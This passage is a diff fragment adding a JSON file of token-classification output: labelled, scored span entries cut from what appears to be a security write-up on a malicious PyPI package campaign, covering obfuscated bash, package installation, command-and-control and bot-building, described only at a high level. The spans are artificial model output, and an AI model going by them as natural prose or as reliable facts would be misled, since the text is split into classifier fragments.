+      "start": 5198,
+      "end": 5199
+    },
+    {
+      "entity": "publishing",
+      "type": "LABEL_1",
+      "score": 0.530828595161438,
+      "start": 5200,
+      "end": 5210
+    },
+    {
+      "entity": "malware on pypi",
+      "type": "LABEL_0",
+      "score": 0.5916478037834167,
+      "start": 5211,
+      "end": 5226
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7967245578765869,
+      "start": 5226,
+      "end": 5227
+    },
+    {
+      "entity": "though",
+      "type": "LABEL_0",
+      "score": 0.7145114541053772,
+      "start": 5228,
+      "end": 5234
+    },
+    {
+      "entity": "we don ’ t expect that our",
+      "type": "LABEL_1",
+      "score": 0.58146733045578,
+      "start": 5235,
+      "end": 5259
+    },
+    {
+      "entity": "attacker friend has any",
+      "type": "LABEL_0",
+      "score": 0.6700377464294434,
+      "start": 5260,
+      "end": 5283
+    },
+    {
+      "entity": "intentions",
+      "type": "LABEL_1",
+      "score": 0.5253939628601074,
+      "start": 5284,
+      "end": 5294
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_0",
+      "score": 0.5731998085975647,
+      "start": 5295,
+      "end": 5297
+    },
+    {
+      "entity": "doing",
+      "type": "LABEL_1",
+      "score": 0.6619443893432617,
+      "start": 5298,
+      "end": 5303
+    },
+    {
+      "entity": "so",
+      "type": "LABEL_0",
+      "score": 0.5213226079940796,
+      "start": 5304,
+      "end": 5306
+    },
+    {
+      "entity": ". unr",
+      "type": "LABEL_1",
+      "score": 0.6942257881164551,
+      "start": 5306,
+      "end": 5311
+    },
+    {
+      "entity": "##olling the remaining",
+      "type": "LABEL_0",
+      "score": 0.6779226660728455,
+      "start": 5311,
+      "end": 5331
+    },
+    {
+      "entity": "obfuscation",
+      "type": "LABEL_1",
+      "score": 0.50190669298172,
+      "start": 5332,
+      "end": 5343
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.5111997127532959,
+      "start": 5344,
+      "end": 5347
+    },
+    {
+      "entity": "question remains,",
+      "type": "LABEL_1",
+      "score": 0.591720461845398,
+      "start": 5348,
+      "end": 5365
+    },
+    {
+      "entity": "though :",
+      "type": "LABEL_0",
+      "score": 0.6699812412261963,
+      "start": 5366,
+      "end": 5373
+    },
+    {
+      "entity": "what does",
+      "type": "LABEL_1",
+      "score": 0.5521804690361023,
+      "start": 5374,
+      "end": 5383
+    },
+    {
+      "entity": "the obfuscated bash",
+      "type": "LABEL_0",
+      "score": 0.7114124298095703,
+      "start": 5384,
+      "end": 5403
+    },
+    {
+      "entity": "script",
+      "type": "LABEL_1",
+      "score": 0.6346690654754639,
+      "start": 5404,
+      "end": 5410
+    },
+    {
+      "entity": "naopceaovaeavocpa.",
+      "type": "LABEL_0",
+      "score": 0.6296142339706421,
+      "start": 5411,
+      "end": 5429
+    },
+    {
+      "entity": "sh",
+      "type": "LABEL_1",
+      "score": 0.5649183392524719,
+      "start": 5429,
+      "end": 5431
+    },
+    {
+      "entity": "in the git",
+      "type": "LABEL_0",
+      "score": 0.6135609149932861,
+      "start": 5432,
+      "end": 5442
+    },
+    {
+      "entity": "repo do",
+      "type": "LABEL_1",
+      "score": 0.6182491183280945,
+      "start": 5443,
+      "end": 5450
+    },
+    {
+      "entity": "? fortunately for us",
+      "type": "LABEL_0",
+      "score": 0.5672282576560974,
+      "start": 5450,
+      "end": 5470
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6174794435501099,
+      "start": 5470,
+      "end": 5471
+    },
+    {
+      "entity": "the attacker committed the full history",
+      "type": "LABEL_0",
+      "score": 0.6616501212120056,
+      "start": 5472,
+      "end": 5511
+    },
+    {
+      "entity": "for this file, allowing us to",
+      "type": "LABEL_1",
+      "score": 0.630750834941864,
+      "start": 5512,
+      "end": 5541
+    },
+    {
+      "entity": "get a",
+      "type": "LABEL_0",
+      "score": 0.5354170203208923,
+      "start": 5542,
+      "end": 5547
+    },
+    {
+      "entity": "good sense",
+      "type": "LABEL_1",
+      "score": 0.5740817785263062,
+      "start": 5548,
+      "end": 5558
+    },
+    {
+      "entity": "of the underlying functionality",
+      "type": "LABEL_0",
+      "score": 0.5807885527610779,
+      "start": 5559,
+      "end": 5590
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7904115915298462,
+      "start": 5590,
+      "end": 5591
+    },
+    {
+      "entity": "the attacker has contributed a few commits updating the obfuscation methods",
+      "type": "LABEL_0",
+      "score": 0.6427106261253357,
+      "start": 5592,
+      "end": 5667
+    },
+    {
+      "entity": "for this",
+      "type": "LABEL_1",
+      "score": 0.6172860860824585,
+      "start": 5668,
+      "end": 5676
+    },
+    {
+      "entity": "file",
+      "type": "LABEL_0",
+      "score": 0.5339899063110352,
+      "start": 5677,
+      "end": 5681
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8092945218086243,
+      "start": 5681,
+      "end": 5682
+    },
+    {
+      "entity": "if",
+      "type": "LABEL_0",
+      "score": 0.6653339266777039,
+      "start": 5683,
+      "end": 5685
+    },
+    {
+      "entity": "we",
+      "type": "LABEL_1",
+      "score": 0.6551459431648254,
+      "start": 5686,
+      "end": 5688
+    },
+    {
+      "entity": "go back",
+      "type": "LABEL_0",
+      "score": 0.6420286297798157,
+      "start": 5689,
+      "end": 5696
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.6223639249801636,
+      "start": 5697,
+      "end": 5699
+    },
+    {
+      "entity": "the earliest",
+      "type": "LABEL_0",
+      "score": 0.6159471273422241,
+      "start": 5700,
+      "end": 5712
+    },
+    {
+      "entity": "commit touch",
+      "type": "LABEL_1",
+      "score": 0.5478960275650024,
+      "start": 5713,
+      "end": 5725
+    },
+    {
+      "entity": "##ing",
+      "type": "LABEL_0",
+      "score": 0.6688778400421143,
+      "start": 5725,
+      "end": 5728
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.6887654066085815,
+      "start": 5729,
+      "end": 5733
+    },
+    {
+      "entity": "file",
+      "type": "LABEL_0",
+      "score": 0.5681814551353455,
+      "start": 5734,
+      "end": 5738
+    },
+    {
+      "entity": ", we",
+      "type": "LABEL_1",
+      "score": 0.6885080337524414,
+      "start": 5738,
+      "end": 5742
+    },
+    {
+      "entity": "find a file rename : from",
+      "type": "LABEL_0",
+      "score": 0.6291777491569519,
+      "start": 5743,
+      "end": 5767
+    },
+    {
+      "entity": "xs",
+      "type": "LABEL_1",
+      "score": 0.5728939175605774,
+      "start": 5768,
+      "end": 5770
+    },
+    {
+      "entity": "##ession - error",
+      "type": "LABEL_0",
+      "score": 0.5978580713272095,
+      "start": 5770,
+      "end": 5782
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8012025356292725,
+      "start": 5782,
+      "end": 5783
+    },
+    {
+      "entity": "sh",
+      "type": "LABEL_0",
+      "score": 0.6829889416694641,
+      "start": 5783,
+      "end": 5785
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5936197638511658,
+      "start": 5786,
+      "end": 5788
+    },
+    {
+      "entity": "naopceaovaeavocpa",
+      "type": "LABEL_0",
+      "score": 0.5892549157142639,
+      "start": 5789,
+      "end": 5806
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.745480477809906,
+      "start": 5806,
+      "end": 5807
+    },
+    {
+      "entity": "sh",
+      "type": "LABEL_0",
+      "score": 0.6437457203865051,
+      "start": 5807,
+      "end": 5809
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.773734986782074,
+      "start": 5809,
+      "end": 5810
+    },
+    {
+      "entity": "surely the attacker wasn ’ t dumb enough",
+      "type": "LABEL_0",
+      "score": 0.6154191493988037,
+      "start": 5811,
+      "end": 5849
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.6288712024688721,
+      "start": 5850,
+      "end": 5852
+    },
+    {
+      "entity": "commit the original file completely unobfuscated",
+      "type": "LABEL_0",
+      "score": 0.6288652420043945,
+      "start": 5853,
+      "end": 5901
+    },
+    {
+      "entity": "… right",
+      "type": "LABEL_1",
+      "score": 0.5803977251052856,
+      "start": 5901,
+      "end": 5908
+    },
+    {
+      "entity": "?",
+      "type": "LABEL_0",
+      "score": 0.6728888154029846,
+      "start": 5908,
+      "end": 5909
+    },
+    {
+      "entity": "spoiler",
+      "type": "LABEL_1",
+      "score": 0.5335714817047119,
+      "start": 5910,
+      "end": 5917
+    },
+    {
+      "entity": "alert : they were",
+      "type": "LABEL_0",
+      "score": 0.6654755473136902,
+      "start": 5918,
+      "end": 5934
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8008148074150085,
+      "start": 5934,
+      "end": 5935
+    },
+    {
+      "entity": "at a high level",
+      "type": "LABEL_0",
+      "score": 0.6252155303955078,
+      "start": 5936,
+      "end": 5951
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6287970542907715,
+      "start": 5951,
+      "end": 5952
+    },
+    {
+      "entity": "the bash checks",
+      "type": "LABEL_0",
+      "score": 0.6640902161598206,
+      "start": 5953,
+      "end": 5968
+    },
+    {
+      "entity": "to see",
+      "type": "LABEL_1",
+      "score": 0.5489632487297058,
+      "start": 5969,
+      "end": 5975
+    },
+    {
+      "entity": "if msfpath",
+      "type": "LABEL_0",
+      "score": 0.6297702193260193,
+      "start": 5976,
+      "end": 5986
+    },
+    {
+      "entity": "exists",
+      "type": "LABEL_1",
+      "score": 0.5984421968460083,
+      "start": 5987,
+      "end": 5993
+    },
+    {
+      "entity": "on the system",
+      "type": "LABEL_0",
+      "score": 0.6987497806549072,
+      "start": 5994,
+      "end": 6007
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7934570908546448,
+      "start": 6007,
+      "end": 6008
+    },
+    {
+      "entity": "if",
+      "type": "LABEL_0",
+      "score": 0.6752877831459045,
+      "start": 6009,
+      "end": 6011
+    },
+    {
+      "entity": "it",
+      "type": "LABEL_1",
+      "score": 0.6754622459411621,
+      "start": 6012,
+      "end": 6014
+    },
+    {
+      "entity": "doesn ’ t",
+      "type": "LABEL_0",
+      "score": 0.6262919902801514,
+      "start": 6015,
+      "end": 6022
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7109081149101257,
+      "start": 6022,
+      "end": 6023
+    },
+    {
+      "entity": "the package",
+      "type": "LABEL_0",
+      "score": 0.6205244660377502,
+      "start": 6024,
+      "end": 6035
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_1",
+      "score": 0.5345476865768433,
+      "start": 6036,
+      "end": 6038
+    },
+    {
+      "entity": "pip",
+      "type": "LABEL_0",
+      "score": 0.6230994462966919,
+      "start": 6039,
+      "end": 6042
+    },
+    {
+      "entity": "installed. it",
+      "type": "LABEL_1",
+      "score": 0.7124941945075989,
+      "start": 6043,
+      "end": 6056
+    },
+    {
+      "entity": "then attempts",
+      "type": "LABEL_0",
+      "score": 0.549845278263092,
+      "start": 6057,
+      "end": 6070
+    },
+    {
+      "entity": "to import",
+      "type": "LABEL_1",
+      "score": 0.6181142926216125,
+      "start": 6071,
+      "end": 6080
+    },
+    {
+      "entity": "check from msfpath",
+      "type": "LABEL_0",
+      "score": 0.6905785799026489,
+      "start": 6081,
+      "end": 6099
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.6515614986419678,
+      "start": 6100,
+      "end": 6103
+    },
+    {
+      "entity": "execute",
+      "type": "LABEL_0",
+      "score": 0.6565935015678406,
+      "start": 6104,
+      "end": 6111
+    },
+    {
+      "entity": "it.",
+      "type": "LABEL_1",
+      "score": 0.7518589496612549,
+      "start": 6112,
+      "end": 6115
+    },
+    {
+      "entity": "msfpath",
+      "type": "LABEL_0",
+      "score": 0.5838690996170044,
+      "start": 6116,
+      "end": 6123
+    },
+    {
+      "entity": "contains",
+      "type": "LABEL_1",
+      "score": 0.5779479146003723,
+      "start": 6124,
+      "end": 6132
+    },
+    {
+      "entity": "additional obfuscation",
+      "type": "LABEL_0",
+      "score": 0.6678565740585327,
+      "start": 6133,
+      "end": 6155
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6761012077331543,
+      "start": 6155,
+      "end": 6156
+    },
+    {
+      "entity": "but",
+      "type": "LABEL_0",
+      "score": 0.6800373196601868,
+      "start": 6157,
+      "end": 6160
+    },
+    {
+      "entity": "using",
+      "type": "LABEL_1",
+      "score": 0.6397097110748291,
+      "start": 6161,
+      "end": 6166
+    },
+    {
+      "entity": "the tried",
+      "type": "LABEL_0",
+      "score": 0.5877088904380798,
+      "start": 6167,
+      "end": 6176
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.623083233833313,
+      "start": 6177,
+      "end": 6180
+    },
+    {
+      "entity": "true replace eval with print",
+      "type": "LABEL_0",
+      "score": 0.6396650075912476,
+      "start": 6181,
+      "end": 6209
+    },
+    {
+      "entity": ", we",
+      "type": "LABEL_1",
+      "score": 0.7173421382904053,
+      "start": 6209,
+      "end": 6213
+    },
+    {
+      "entity": "were able",
+      "type": "LABEL_0",
+      "score": 0.543716549873352,
+      "start": 6214,
+      "end": 6223
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.6524560451507568,
+      "start": 6224,
+      "end": 6226
+    },
+    {
+      "entity": "get",
+      "type": "LABEL_0",
+      "score": 0.5179396867752075,
+      "start": 6227,
+      "end": 6230
+    },
+    {
+      "entity": "back to",
+      "type": "LABEL_1",
+      "score": 0.5624712705612183,
+      "start": 6231,
+      "end": 6238
+    },
+    {
+      "entity": "the original",
+      "type": "LABEL_0",
+      "score": 0.7289411425590515,
+      "start": 6239,
+      "end": 6251
+    },
+    {
+      "entity": "python for",
+      "type": "LABEL_1",
+      "score": 0.5390926599502563,
+      "start": 6252,
+      "end": 6262
+    },
+    {
+      "entity": "check",
+      "type": "LABEL_0",
+      "score": 0.7379764914512634,
+      "start": 6263,
+      "end": 6268
+    },
+    {
+      "entity": ". py",
+      "type": "LABEL_1",
+      "score": 0.6858240365982056,
+      "start": 6268,
+      "end": 6271
+    },
+    {
+      "entity": "quickly",
+      "type": "LABEL_0",
+      "score": 0.688121497631073,
+      "start": 6272,
+      "end": 6279
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8028272390365601,
+      "start": 6279,
+      "end": 6280
+    },
+    {
+      "entity": "it",
+      "type": "LABEL_1",
+      "score": 0.569765567779541,
+      "start": 8471,
+      "end": 8473
+    },
+    {
+      "entity": "receives data from",
+      "type": "LABEL_0",
+      "score": 0.6692793369293213,
+      "start": 8474,
+      "end": 8492
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.8227546215057373,
+      "start": 8493,
+      "end": 8497
+    },
+    {
+      "entity": "server and",
+      "type": "LABEL_0",
+      "score": 0.5109025835990906,
+      "start": 8498,
+      "end": 8508
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6592442989349365,
+      "start": 8508,
+      "end": 8509
+    },
+    {
+      "entity": "depending",
+      "type": "LABEL_0",
+      "score": 0.5497285723686218,
+      "start": 8510,
+      "end": 8519
+    },
+    {
+      "entity": "on",
+      "type": "LABEL_1",
+      "score": 0.5674682259559631,
+      "start": 8520,
+      "end": 8522
+    },
+    {
+      "entity": "the command received",
+      "type": "LABEL_0",
+      "score": 0.6125581860542297,
+      "start": 8523,
+      "end": 8543
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7171924114227295,
+      "start": 8543,
+      "end": 8544
+    },
+    {
+      "entity": "takes action on the",
+      "type": "LABEL_0",
+      "score": 0.6265987157821655,
+      "start": 8545,
+      "end": 8564
+    },
+    {
+      "entity": "infected machine.",
+      "type": "LABEL_1",
+      "score": 0.671990692615509,
+      "start": 8565,
+      "end": 8582
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6799009442329407,
+      "start": 8583,
+      "end": 8586
+    },
+    {
+      "entity": "attacker",
+      "type": "LABEL_1",
+      "score": 0.5402809381484985,
+      "start": 8587,
+      "end": 8595
+    },
+    {
+      "entity": "’ s intentions",
+      "type": "LABEL_0",
+      "score": 0.5548797249794006,
+      "start": 8595,
+      "end": 8608
+    },
+    {
+      "entity": "are",
+      "type": "LABEL_1",
+      "score": 0.6188470721244812,
+      "start": 8609,
+      "end": 8612
+    },
+    {
+      "entity": "now clear",
+      "type": "LABEL_0",
+      "score": 0.546535313129425,
+      "start": 8613,
+      "end": 8622
+    },
+    {
+      "entity": ": infect as",
+      "type": "LABEL_1",
+      "score": 0.6212142109870911,
+      "start": 8622,
+      "end": 8633
+    },
+    {
+      "entity": "many machines as possible by way of infected",
+      "type": "LABEL_0",
+      "score": 0.6195690631866455,
+      "start": 8634,
+      "end": 8678
+    },
+    {
+      "entity": "python",
+      "type": "LABEL_1",
+      "score": 0.6485686898231506,
+      "start": 8679,
+      "end": 8685
+    },
+    {
+      "entity": "packages",
+      "type": "LABEL_0",
+      "score": 0.7633408904075623,
+      "start": 8686,
+      "end": 8694
+    },
+    {
+      "entity": ", and build",
+      "type": "LABEL_1",
+      "score": 0.6375359892845154,
+      "start": 8694,
+      "end": 8705
+    },
+    {
+      "entity": "an army of attacker -",
+      "type": "LABEL_0",
+      "score": 0.6915427446365356,
+      "start": 8706,
+      "end": 8726
+    },
+    {
+      "entity": "controlled bots. and",
+      "type": "LABEL_1",
+      "score": 0.6357526183128357,
+      "start": 8726,
+      "end": 8746
+    },
+    {
+      "entity": "what",
+      "type": "LABEL_0",
+      "score": 0.7157495617866516,
+      "start": 8747,
+      "end": 8751
+    },
+    {
+      "entity": "about",
+      "type": "LABEL_1",
+      "score": 0.624923050403595,
+      "start": 8752,
+      "end": 8757
+    },
+    {
+      "entity": "cronjob",
+      "type": "LABEL_0",
+      "score": 0.6173633337020874,
+      "start": 8758,
+      "end": 8765
+    },
+    {
+      "entity": ". out that",
+      "type": "LABEL_1",
+      "score": 0.5553767085075378,
+      "start": 8765,
+      "end": 8774
+    },
+    {
+      "entity": "appears",
+      "type": "LABEL_0",
+      "score": 0.6204294562339783,
+      "start": 8775,
+      "end": 8782
+    },
+    {
+      "entity": "in the",
+      "type": "LABEL_1",
+      "score": 0.5369245409965515,
+      "start": 8783,
+      "end": 8789
+    },
+    {
+      "entity": "git repo?",
+      "type": "LABEL_0",
+      "score": 0.5983101725578308,
+      "start": 8790,
+      "end": 8799
+    },
+    {
+      "entity": "what ’",
+      "type": "LABEL_1",
+      "score": 0.5367729663848877,
+      "start": 8800,
+      "end": 8805
+    },
+    {
+      "entity": "s the purpose",
+      "type": "LABEL_0",
+      "score": 0.681821346282959,
+      "start": 8805,
+      "end": 8818
+    },
+    {
+      "entity": "of this",
+      "type": "LABEL_1",
+      "score": 0.6594425439834595,
+      "start": 8819,
+      "end": 8826
+    },
+    {
+      "entity": "file in",
+      "type": "LABEL_0",
+      "score": 0.6121892929077148,
+      "start": 8827,
+      "end": 8834
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.6962918639183044,
+      "start": 8835,
+      "end": 8839
+    },
+    {
+      "entity": "whole scheme?",
+      "type": "LABEL_0",
+      "score": 0.5832936763763428,
+      "start": 8840,
+      "end": 8853
+    },
+    {
+      "entity": "we ’",
+      "type": "LABEL_1",
+      "score": 0.6096056699752808,
+      "start": 8854,
+      "end": 8857
+    },
+    {
+      "entity": "ll",
+      "type": "LABEL_0",
+      "score": 0.5941078662872314,
+      "start": 8857,
+      "end": 8859
+    },
+    {
+      "entity": "be publishing a",
+      "type": "LABEL_1",
+      "score": 0.6455739736557007,
+      "start": 8860,
+      "end": 8875
+    },
+    {
+      "entity": "follow -",
+      "type": "LABEL_0",
+      "score": 0.6231342554092407,
+      "start": 8876,
+      "end": 8883
+    },
+    {
+      "entity": "up post outlining how",
+      "type": "LABEL_1",
+      "score": 0.6457962989807129,
+      "start": 8883,
+      "end": 8904
+    },
+    {
+      "entity": "one",
+      "type": "LABEL_0",
+      "score": 0.5237606167793274,
+      "start": 8905,
+      "end": 8908
+    },
+    {
+      "entity": "of our",
+      "type": "LABEL_1",
+      "score": 0.6476930379867554,
+      "start": 8909,
+      "end": 8915
+    },
+    {
+      "entity": "engineers busted out",
+      "type": "LABEL_0",
+      "score": 0.6218799352645874,
+      "start": 8916,
+      "end": 8936
+    },
+    {
+      "entity": "gh",
+      "type": "LABEL_1",
+      "score": 0.5167521834373474,
+      "start": 8937,
+      "end": 8939
+    },
+    {
+      "entity": "##id",
+      "type": "LABEL_0",
+      "score": 0.6004253625869751,
+      "start": 8939,
+      "end": 8941
+    },
+    {
+      "entity": "##ra to",
+      "type": "LABEL_1",
+      "score": 0.7030948400497437,
+      "start": 8941,
+      "end": 8946
+    },
+    {
+      "entity": "make",
+      "type": "LABEL_0",
+      "score": 0.6009126901626587,
+      "start": 8947,
+      "end": 8951
+    },
+    {
+      "entity": "sense of this file. this is",
+      "type": "LABEL_1",
+      "score": 0.6772721409797668,
+      "start": 8952,
+      "end": 8979
+    },
+    {
+      "entity": "not",
+      "type": "LABEL_0",
+      "score": 0.6409353613853455,
+      "start": 8980,
+      "end": 8983
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_1",
+      "score": 0.5419589877128601,
+      "start": 8984,
+      "end": 8987
+    },
+    {
+      "entity": "end at",
+      "type": "LABEL_0",
+      "score": 0.6010119915008545,
+      "start": 8988,
+      "end": 8994
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.6432337164878845,
+      "start": 8995,
+      "end": 8999
+    },
+    {
+      "entity": "point",
+      "type": "LABEL_0",
+      "score": 0.7092115879058838,
+      "start": 9000,
+      "end": 9005
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7118545770645142,
+      "start": 9005,
+      "end": 9006
+    },
+    {
+      "entity": "the attacker",
+      "type": "LABEL_0",
+      "score": 0.6122561693191528,
+      "start": 9007,
+      "end": 9019
+    },
+    {
+      "entity": "'",
+      "type": "LABEL_1",
+      "score": 0.547271728515625,
+      "start": 9019,
+      "end": 9020
+    },
+    {
+      "entity": "s malicious packages have",
+      "type": "LABEL_0",
+      "score": 0.6536304950714111,
+      "start": 9020,
+      "end": 9045
+    },
+    {
+      "entity": "been removed. we",
+      "type": "LABEL_1",
+      "score": 0.5688258409500122,
+      "start": 9046,
+      "end": 9062
+    },
+    {
+      "entity": "reported",
+      "type": "LABEL_0",
+      "score": 0.6252214908599854,
+      "start": 9063,
+      "end": 9071
+    },
+    {
+      "entity": "their",
+      "type": "LABEL_1",
+      "score": 0.6416204571723938,
+      "start": 9072,
+      "end": 9077
+    },
+    {
+      "entity": "github repository",
+      "type": "LABEL_0",
+      "score": 0.619458019733429,
+      "start": 9078,
+      "end": 9095
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7002266645431519,
+      "start": 9095,
+      "end": 9096
+    },
+    {
+      "entity": "reported",
+      "type": "LABEL_0",
+      "score": 0.5973839163780212,
+      "start": 9097,
+      "end": 9105
+    },
+    {
+      "entity": "their",
+      "type": "LABEL_1",
+      "score": 0.6152453422546387,
+      "start": 9106,
+      "end": 9111
+    },
+    {
+      "entity": "host",
+      "type": "LABEL_0",
+      "score": 0.8040332794189453,
+      "start": 9112,
+      "end": 9116
+    },
+    {
+      "entity": "to no",
+      "type": "LABEL_1",
+      "score": 0.6144118905067444,
+      "start": 9117,
+      "end": 9122
+    },
+    {
+      "entity": "- ip",
+      "type": "LABEL_0",
+      "score": 0.7430416345596313,
+      "start": 9122,
+      "end": 9125
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.638676106929779,
+      "start": 9126,
+      "end": 9129
+    },
+    {
+      "entity": "publicly shame",
+      "type": "LABEL_0",
+      "score": 0.5926253795623779,
+      "start": 9130,
+      "end": 9144
+    },
+    {
+      "entity": "##d",
+      "type": "LABEL_1",
+      "score": 0.5268018245697021,
+      "start": 9144,
+      "end": 9145
+    },
+    {
+      "entity": "them",
+      "type": "LABEL_0",
+      "score": 0.5147783160209656,
+      "start": 9146,
+      "end": 9150
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.6916305422782898,
+      "start": 9150,
+      "end": 9151
+    },
+    {
+      "entity": "software supply chain attack thwarted! while",
+      "type": "LABEL_0",
+      "score": 0.6776200532913208,
+      "start": 9152,
+      "end": 9197
+    },
+    {
+      "entity": "we",
+      "type": "LABEL_1",
+      "score": 0.5038718581199646,
+      "start": 9198,
+      "end": 9200
+    },
+    {
+      "entity": "successfully disrupted",
+      "type": "LABEL_0",
+      "score": 0.5838807821273804,
+      "start": 9201,
+      "end": 9223
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.8382529616355896,
+      "start": 9224,
+      "end": 9228
+    },
+    {
+      "entity": "campaign",
+      "type": "LABEL_0",
+      "score": 0.7571057677268982,
+      "start": 9229,
+      "end": 9237
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6892296075820923,
+      "start": 9237,
+      "end": 9238
+    },
+    {
+      "entity": "rest assured",
+      "type": "LABEL_0",
+      "score": 0.7211059331893921,
+      "start": 9239,
+      "end": 9251
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.8466174006462097,
+      "start": 9252,
+      "end": 9256
+    },
+    {
+      "entity": "is not the last",
+      "type": "LABEL_0",
+      "score": 0.6717345714569092,
+      "start": 9257,
+      "end": 9272
+    },
+    {
+      "entity": "time we",
+      "type": "LABEL_1",
+      "score": 0.6685149073600769,
+      "start": 9273,
+      "end": 9280
+    },
+    {
+      "entity": "’ ll see",
+      "type": "LABEL_0",
+      "score": 0.6552699208259583,
+      "start": 9280,
+      "end": 9287
+    },
+    {
+      "entity": "this threat",
+      "type": "LABEL_1",
+      "score": 0.732911229133606,
+      "start": 9288,
+      "end": 9299
+    },
+    {
+      "entity": "actor",
+      "type": "LABEL_0",
+      "score": 0.5489421486854553,
+      "start": 9300,
+      "end": 9305
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.73613041639328,
+      "start": 9305,
+      "end": 9306
+    },
+    {
+      "entity": "they ’ ll",
+      "type": "LABEL_0",
+      "score": 0.6494166254997253,
+      "start": 9307,
+      "end": 9314
+    },
+    {
+      "entity": "be",
+      "type": "LABEL_1",
+      "score": 0.5919069051742554,
+      "start": 9315,
+      "end": 9317
+    },
+    {
+      "entity": "back with updated",
+      "type": "LABEL_0",
+      "score": 0.5501260757446289,
+      "start": 9318,
+      "end": 9335
+    },
+    {
+      "entity": "ttps,",
+      "type": "LABEL_1",
+      "score": 0.6678961515426636,
+      "start": 9336,
+      "end": 9341
+    },
+    {
+      "entity": "targeting software engineers with innocuous packages",
+      "type": "LABEL_0",
+      "score": 0.6200908422470093,
+      "start": 9342,
+      "end": 9394
+    },
+    {
+      "entity": "that",
+      "type": "LABEL_1",
+      "score": 0.5869085788726807,
+      "start": 9395,
+      "end": 9399
+    },
+    {
+      "entity": "subtly insert malware onto developer machines",
+      "type": "LABEL_0",
+      "score": 0.6431659460067749,
+      "start": 9400,
+      "end": 9445
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7099376916885376,
+      "start": 9445,
+      "end": 9446
+    },
+    {
+      "entity": "the attackers are numerous",
+      "type": "LABEL_0",
+      "score": 0.6172645092010498,
+      "start": 9447,
+      "end": 9473
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.6749991178512573,
+      "start": 9474,
+      "end": 9477
+    },
+    {
+      "entity": "persistent ;",
+      "type": "LABEL_0",
+      "score": 0.6890110969543457,
+      "start": 9478,
+      "end": 9489
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_1",
+      "score": 0.5130680799484253,
+      "start": 9490,
+      "end": 9491
+    },
+    {
+      "entity": "true software hydra -",
+      "type": "LABEL_0",
+      "score": 0.6617791056632996,
+      "start": 9492,
+      "end": 9513
+    },
+    {
+      "entity": "cut off",
+      "type": "LABEL_1",
+      "score": 0.5681282877922058,
+      "start": 9514,
+      "end": 9521
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6968579888343811,
+      "start": 9522,
+      "end": 9525
+    },
+    {
+      "entity": "head",
+      "type": "LABEL_1",
+      "score": 0.6798571944236755,
+      "start": 9526,
+      "end": 9530
+    },
+    {
+      "entity": "of one attacker",
+      "type": "LABEL_0",
+      "score": 0.6767246723175049,
+      "start": 9531,
+      "end": 9546
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.6533428430557251,
+      "start": 9547,
+      "end": 9550
+    },
+    {
+      "entity": "two more attackers take",
+      "type": "LABEL_0",
+      "score": 0.6069151163101196,
+      "start": 9551,
+      "end": 9574
+    },
+    {
+      "entity": "their place.",
+      "type": "LABEL_1",
+      "score": 0.688510000705719,
+      "start": 9575,
+      "end": 9587
+    },
+    {
+      "entity": "thus",
+      "type": "LABEL_0",
+      "score": 0.5418325662612915,
+      "start": 9588,
+      "end": 9592
+    },
+    {
+      "entity": ", we as",
+      "type": "LABEL_1",
+      "score": 0.6878520846366882,
+      "start": 9592,
+      "end": 9599
+    },
+    {
+      "entity": "engineers",
+      "type": "LABEL_0",
+      "score": 0.5342936515808105,
+      "start": 9600,
+      "end": 9609
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7591213583946228,
+      "start": 9609,
+      "end": 9610
+    },
+    {
+      "entity": "must",
+      "type": "LABEL_0",
